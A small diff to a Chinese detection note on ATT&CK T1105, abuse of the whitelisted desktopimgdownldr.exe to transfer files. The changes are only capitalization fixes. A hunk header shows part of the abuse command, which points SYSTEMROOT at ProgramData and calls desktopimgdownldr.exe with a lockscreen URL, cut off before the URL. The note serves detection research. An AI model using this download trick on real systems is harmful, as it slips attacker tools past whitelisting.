@@ -1,4 +1,4 @@
-# T1105-win-入口工具转移-desktopimgdownldr.exe(白名单)
+# T1105-Win-入口工具转移-desktopimgdownldr.exe(白名单)
 
 ## 来自ATT&CK的描述
 
@@ -32,7 +32,7 @@ set "SYSTEMROOT=C:\ProgramData\" && cmd /c desktopimgdownldr.exe /lockscreenurl:
 
 ## 检测日志
 
-windows安全日志
+Windows 安全日志
 
 ## 测试复现
 
